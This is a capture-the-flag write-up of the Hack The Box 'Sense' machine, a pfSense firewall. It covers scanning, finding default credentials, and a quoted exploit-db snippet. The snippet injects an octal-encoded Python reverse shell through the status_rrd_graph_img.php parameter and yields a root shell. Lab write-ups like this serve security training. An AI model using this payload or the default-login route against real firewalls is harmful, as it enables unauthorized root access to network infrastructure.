---
"title": "Hack The Box - Sense"
"date": 2020-07-10
"tags": ["freebsd", "easy", "pfsense"]
"keywords": ["freebsd", "easy", "pfsense"]
"categories": ["HackTheBox OSCP-Like"]
"author": "Ghostbyt3"
"description": "We are going to pwn Sense from Hack The Box."
"featured_image": "/img/htb-sense/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox OSCP-Like - Writeup"
---


![Untitled](/img/htb-sense/Untitled.png)

We are going to pwn Sense from Hack The Box.                                                             

Link: [https://www.hackthebox.eu/home/machines/profile/111](https://www.hackthebox.eu/home/machines/profile/111)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): Comau embedded (92%), OpenBSD 4.X (86%), FreeBSD 8.X (85%)
OS CPE: cpe:/o:openbsd:openbsd:4.0 cpe:/o:freebsd:freebsd:8.1
Aggressive OS guesses: Comau C4G robot control unit (92%), OpenBSD 4.0 (86%), FreeBSD 8.1 (85%), OpenBSD 4.3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

## HTTPS Enumeration

When I tried to visit Port 80 first it redirects to `https`

![Untitled](/img/htb-sense/Untitled%201.png)

Looks like its a `pfSense` login page.

> What is pfsense? **pfSense is an open source firewall/router computer software distribution based on FreeBSD. It is installed on a physical computer or a virtual machine to make a dedicated firewall/router for a network.**

I searched for default credentials and got this.

![Untitled](/img/htb-sense/Untitled%202.png)

When I tried to login, it says Username or Password incorrect. I decided to run Gobuster

### GoBuster Scan Results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.60
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/07/10 10:36:09 Starting gobuster
===============================================================
/index.php (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/csrf (Status: 301)
/system-users.txt (Status: 200)
/filebrowser (Status: 301)
/%7Echeckout%7E (Status: 403)
```

Ok we got an username finally and it says password is default one, which is `pfsense`

![Untitled](/img/htb-sense/Untitled%203.png)

I tried login with `rohit : pfsense` the default password. And it worked.

![Untitled](/img/htb-sense/Untitled%204.png)

Since we got the version of it, I decided to search for exploits and found this.

> [https://www.exploit-db.com/exploits/43560](https://www.exploit-db.com/exploits/43560)

## Getting Shell

According to exploit its looking for `/status_rrd_graph_img.php` to command injection. And helps us to get python reverse shell.

```python
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)

payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"
```

so I decided to check whether its there or not? And Yes its there. Downloaded the exploit to my machine.

![Untitled](/img/htb-sense/Untitled%205.png)

First I used `--help` parameter to know what going on and set those parameters and I got the shell.

![Untitled](/img/htb-sense/Untitled%206.png)

We don’t have to escalate privileges since pfSense is running as root and the command injection vulnerability leads to root shell.

We own the box.